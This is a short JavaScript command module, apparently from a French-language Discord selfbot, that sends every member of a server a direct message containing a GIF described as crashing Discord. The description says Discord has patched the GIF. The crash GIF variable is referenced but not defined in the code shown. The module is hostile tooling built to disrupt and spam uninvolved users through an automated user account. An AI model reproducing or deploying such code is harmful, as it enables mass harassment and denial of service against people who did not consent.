import chalk from 'chalk';

export const name = 'mpcrash';
export const description = 'envoie, à toutes les personnes d\'un serveur, un gif qui fait crash Discord(patch par Discord)';
export function execute(self, message) {
    if(message.channel.type === 'dm') return message.edit('\`Il faut faire cette commande sur un serveur et non pas en mp\`')
    message.edit(`/!\ \`Il faut deja avoir ouvert les mps avec l\'utilisateur pour que cela fonctionne\``)
    message.guild.members.forEach((m) => {
        if(m.user.id == self.user.id) return;
        m.send(gifCrash).catch(() => console.log(chalk.green("Impossible de mp " + m.user.tag)))
    })
}